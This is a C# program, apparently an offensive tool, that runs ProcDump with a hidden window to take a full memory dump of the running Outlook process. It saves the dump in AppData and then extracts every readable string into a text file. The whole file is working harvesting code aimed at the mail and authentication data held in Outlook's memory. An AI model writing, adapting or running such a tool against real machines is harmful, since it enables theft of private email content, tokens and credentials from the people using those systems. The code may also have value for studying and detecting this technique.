using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;

class Program
{
    static void Main()
    {
        Console.WriteLine("[+] Starting extraction...");

        string currentDir = Directory.GetCurrentDirectory();


        // find the process dump executable in current directory
        // save it in current directory with any of the names listed below.
        // default name from Microsoft is procdump.exe
        string[] possibleExeNames = { "procdump.exe", "processdump.exe", "proc_dump.exe" };

        string procDumpPath = possibleExeNames
            .Select(name => Path.Combine(currentDir, name))
            .FirstOrDefault(File.Exists);

        if (procDumpPath == null)
        {
            Console.WriteLine("[-] Process Dump exe not found in current directory.");
            return;
        }

        Console.WriteLine("[+] Process Dump exe found: " + procDumpPath);


        // find the process ID of outlook process
        int outlookPid = GetPid("OUTLOOK");

        if (outlookPid == 0)
        {
            Console.WriteLine("[!] OUTLOOK.exe not found, trying olk.exe...");
            outlookPid = GetPid("olk");
        }

        if (outlookPid == 0)
        {
            Console.WriteLine("[-] No Outlook-related process found.");
            return;
        }

        Console.WriteLine("[+] Target process PID: " + outlookPid);


        // create memory dump of the outlook process
        string dumpFilePath = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
            "processotlk.dmp"
        );

        Console.WriteLine("[+] Dump file path: " + dumpFilePath);


        string arguments = $"-accepteula -ma {outlookPid} \"{dumpFilePath}\"";

        Console.WriteLine("[+] Running Process Dump...");

        ProcessStartInfo psi = new ProcessStartInfo
        {
            FileName = procDumpPath,
            Arguments = arguments,
            UseShellExecute = false,
            CreateNoWindow = true,
            RedirectStandardOutput = true,
            RedirectStandardError = true
        };

        try
        {
            using (Process proc = Process.Start(psi))
            {
                proc.WaitForExit();
            }

            Console.WriteLine("[+] Memory dump completed successfully.");
        }
        catch (Exception ex)
        {
            Console.WriteLine("[-] Dump execution failed: " + ex.Message);
            return;
        }

        // Parse the DMP file
        ExtractReadableStrings(dumpFilePath);

    }

    // PID finding function
    static int GetPid(string processName)
    {
        var proc = Process.GetProcessesByName(processName).FirstOrDefault();
        return proc?.Id ?? 0;
    }


    // Reading DMP in chunks
    static void ExtractReadableStrings(string dumpFilePath)
    {
        Console.WriteLine("[+] Starting dump parsing...");

        string outputFile = Path.Combine(
            Directory.GetCurrentDirectory(),
            "extracted_strings.txt"
        );

        Console.WriteLine("[+] Output file: " + outputFile);

        using (MemoryStream memoryStream = new MemoryStream())
        {
            const int bufferSize = 1024 * 1024; // 1 MB
            byte[] buffer = new byte[bufferSize];

            using (FileStream fs = new FileStream(dumpFilePath, FileMode.Open, FileAccess.Read))
            {
                int bytesRead;

                while ((bytesRead = fs.Read(buffer, 0, buffer.Length)) > 0)
                {
                    string chunkText = Encoding.ASCII.GetString(buffer, 0, bytesRead);

                    var matches = Regex.Matches(chunkText, @"[\x20-\x7E]{4,}");

                    foreach (Match m in matches)
                    {
                        byte[] lineBytes = Encoding.UTF8.GetBytes(m.Value + Environment.NewLine);
                        memoryStream.Write(lineBytes, 0, lineBytes.Length);
                    }
                }
            }

            File.WriteAllBytes(outputFile, memoryStream.ToArray());
        }

        Console.WriteLine("[+] Extraction complete.");
        Console.WriteLine("[+] Extracted strings saved successfully.");
    }
}
